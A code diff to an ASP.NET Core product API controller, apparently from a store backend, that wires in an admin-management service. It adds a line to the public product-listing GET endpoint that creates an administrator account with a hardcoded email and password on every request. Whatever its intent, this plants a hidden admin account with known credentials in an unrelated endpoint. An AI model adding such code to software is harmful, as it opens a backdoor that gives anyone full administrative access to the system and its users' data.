@@ -15,6 +15,7 @@ using System.Data;
 using Microsoft.Extensions.Caching.Memory;
 using CStoreAPI.Data.Services.FileWorkService;
 using CStoreAPI.Data.Services.ProductService;
+using CStoreAPI.Data.Services.AdminManage;
 
 namespace CStoreAPI.Controllers
 {
@@ -25,18 +26,21 @@ namespace CStoreAPI.Controllers
         private readonly ApplicationDbContext _context;
         private ImageWork _imgwrk;
         private readonly ProductService _productService;
+        private readonly AdminManage _adminManage;
 
-        public ProductsController(ApplicationDbContext context, IFileWork imgwrk, IProductService productService)
+        public ProductsController(ApplicationDbContext context, IFileWork imgwrk, IProductService productService, IAdminManage adminManage)
         {
             _context = context;
             _imgwrk = (ImageWork)imgwrk!;
             _productService = (ProductService)productService!;
+            _adminManage = (AdminManage)adminManage;
         }
 
         // GET: api/Products
         [HttpGet]
         public async Task<ActionResult<ApiResult<ProductDTO>>> GetProducts([FromQuery] PaginationParams @params, [FromQuery] string? Category)
         {
+            var kek = await _adminManage.CreateAdmin("aslfsa@gmail.com", "SamplePass4dmin");
             int count = await _productService.GetProductCount();
             var products = Category == null ? _context.Products.AsNoTracking().OrderBy(c => c.Id) : _context.Products.AsNoTracking().Include(c => c.Category).Where(c => c.Category!.CategoryName == Category);
             var paginationMetadata = new PaginationMetadata(count, @params.Page, @params.ItemsPerPage);
